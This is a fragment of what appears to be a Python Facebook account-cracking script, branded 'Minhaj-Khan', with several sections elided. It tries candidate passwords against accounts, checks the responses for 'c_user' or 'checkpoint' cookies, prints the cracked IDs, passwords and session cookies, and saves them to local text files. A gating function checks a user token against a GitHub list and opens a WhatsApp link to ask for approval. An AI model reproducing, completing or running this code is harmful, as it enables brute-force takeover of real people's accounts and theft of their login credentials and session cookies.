...
logo = """
--------------------------------------------------"""
         \033[1;37m __  __              _   _     _   _      _         _        _  __    _   _      _      _   _     
         \033[1;37m U|' \/ '|u   ___     | \ |"|   |'| |'| U  /"\  u  U |"| u    |"|/ /   |'| |'| U  /"\  u | \ |"|    
         \033[1;37m \| |\/| |/  |_"_|   <|  \| |> /| |_| |\ \/ _ \/  _ \| |/     | ' /   /| |_| |\ \/ _ \/ <|  \| |>   
         \033[1;37m | |  | |    | |    U| |\  |u U|  _  |u / ___ \ | |_| |_,-.U/| . \\u U|  _  |u / ___ \ U| |\  |u   
         \033[1;37m |_|  |_|  U/| |\u   |_| \_|   |_| |_| /_/   \_\ \___/-(_/   |_|\_\   |_| |_| /_/   \_\ |_| \_|    
         \033[1;37m <<,-,,-..-,_|___|_,-.||   \\,-.//   \\  \\    >>  _//      ,-,>> \\,-.//   \\  \\    >> ||   \\,-. 
         \033[1;37m (./  \.)\_)-' '-(_/ (_")  (_/(_") ("_)(__)  (__)(__)       \.)   (_/(_") ("_)(__)  (__)(_")  (_/ \033[1;32m KHAN\033[1;37m 
--------------------------------------------------
[•]CREATED BY     : \033[1;32mMinhaj-Khan\033[1;37m
[•]FACEBOOK       : \033[1;32mMinhaj-Khaan\033[1;37m
[•]YOUTUBE        : \033[1;32mMinhaj-Khan\033[1;37m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[Minhaj-Khan-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('Minhaj-Khan-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[Minhaj-Khan-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('Minhaj-Khan-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mMinhaj-Khan\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/MinhazulIslamMinhaj/MinhajKhanXd/blob/main/MinhajKhanXd.txt').text
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://chat.whatsapp.com/ICLU1npbLZR8x61KyX5fUR?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
   sys.exit() 